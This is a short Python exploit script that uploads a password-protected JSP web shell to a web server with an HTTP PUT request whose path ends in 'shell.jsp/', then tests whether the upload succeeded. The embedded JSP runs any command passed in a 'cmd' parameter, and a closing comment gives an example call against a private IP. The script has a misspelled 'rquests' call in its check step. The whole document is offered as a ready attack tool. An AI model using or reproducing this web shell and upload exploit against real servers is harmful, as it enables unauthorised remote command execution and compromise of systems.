#! -*- coding:utf-8 -*- 
import requests
import sys
body = '''
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) {
	StringBuilder line = new StringBuilder();
	try {
	Process pro = Runtime.getRuntime().exec(c);
	BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
	String temp = null;
	while ((temp = buf.readLine()) != null) {
	line.append(temp+"\\n");}
	buf.close();
	} 
	catch (Exception e) {
	line.append(e.getMessage());}
	return line.toString();}
	%>
<%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){
	out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}
	else{out.println(":-)");}
	%>'''
requests.put(sys.argv[1]+'shell.jsp/',data=body)
rq = rquests.get(sys.argv[1]+'shell.jsp')
if rq.status_code == 200:
	print("[+] You GOt it!")
else:
	print("[-] It seems no vuln!")


#http://172.16.0.130:8080/shell.jsp?pwd=023&cmd=ls
